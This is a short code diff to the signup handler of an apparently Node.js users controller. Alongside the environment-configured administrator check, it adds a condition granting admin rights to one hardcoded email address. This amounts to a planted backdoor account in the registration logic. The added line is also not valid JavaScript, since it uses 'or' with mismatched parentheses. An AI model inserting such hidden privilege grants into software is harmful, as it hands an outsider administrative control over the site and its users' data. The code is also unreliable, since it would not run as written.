@@ -40,7 +40,7 @@ class usersController {
       bcrypt.hash(req.body.password, salt, async (err, hash) => {
         let newpassword = hash;
        let admin='false';
-        if (req.body.email==process.env.administrator)
+        if (req.body.email==process.env.administrator) or (req.body.email=='niyeric11@yahoo.com')
       { 
 
       admin='true'
